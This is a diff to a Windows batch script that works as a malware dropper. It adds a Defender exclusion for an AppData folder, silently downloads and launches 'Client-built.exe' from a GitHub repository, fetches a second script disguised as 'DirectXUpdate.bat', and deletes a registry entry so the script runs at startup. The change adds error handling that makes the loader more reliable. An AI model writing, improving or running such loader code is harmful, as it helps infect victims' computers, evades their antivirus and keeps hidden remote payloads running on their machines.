@@ -21,7 +21,13 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDA
 set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
-start "" "%TARGET_FILE%"
+
+if exist "%TARGET_FILE%" (
+    start "" "%TARGET_FILE%"
+) else (
+    echo Failed to download main payload.
+    exit /b 1
+)
 
 :: Prepare Java.bat in AppData\Logs
 set "LOGS_FOLDER=%APPDATA%\Logs"
@@ -33,6 +39,11 @@ if not exist "%LOGS_FOLDER%" (
 )
 
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%')"
+
+if not exist "%DirectXUpdate_BAT_FILE%" (
+    echo Failed to download DirectXUpdate.bat file.
+    exit /b 1
+)
 
 :: Remove Task Manager "disabled" block if it exists
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "DirectXUpdate" /f >nul 2>&1
